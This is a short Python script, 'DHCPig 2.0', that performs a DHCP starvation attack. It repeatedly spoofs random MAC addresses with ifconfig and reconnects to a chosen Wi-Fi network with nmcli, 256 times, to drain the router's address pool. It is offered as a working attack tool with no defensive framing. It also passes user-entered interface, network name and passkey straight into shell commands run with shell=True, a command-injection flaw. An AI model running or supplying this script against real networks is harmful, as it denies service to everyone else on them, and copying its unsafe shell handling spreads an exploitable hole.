"""DHCPig 2.0, Written by xXTheSunXx. Update March 20st 2024"""
import socket
import sys
import time
from getmac import get_mac_address as gma
from generate_mac import generate_mac
import subprocess


def main():
    confirm = input('Run DHCPig [(y)es or(n)o]? ')
    if confirm == 'yes' or confirm == 'y':
        print('Running DHCPig...')

    else:
        print('Exiting DHCPig...')
        time.sleep(3)
        sys.exit()


    print('Generating random Mac Address...')
    var_mac = ''
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    iface = input("Which interface would you like to use (enter network interface): ")
    essid = input("Which essid would you like to connect to (network name): ")
    key = input("Interet essid passkey: ")

    print(f'Current Mac address: {gma()}')
    print(f'Current IP address: {IP}')
    
    n = 0
    while n < 256:

        var_mac = generate_mac.total_random()
        subprocess.check_output(f"ifconfig {iface} down", shell=True)
        subprocess.check_output(f"ifconfig {iface} hw ether {var_mac}", shell=True)
        subprocess.check_output(f"ifconfig {iface} up", shell=True)
        subprocess.check_output(f"nmcli dev wifi connect {essid} password {key}", shell=True)

        hostname = socket.gethostname()
        IP = socket.gethostbyname(hostname)

        print(f'Current Mac address: {gma()}')
        print(f'Current IP address: {IP}')
        n = n + 1


main()
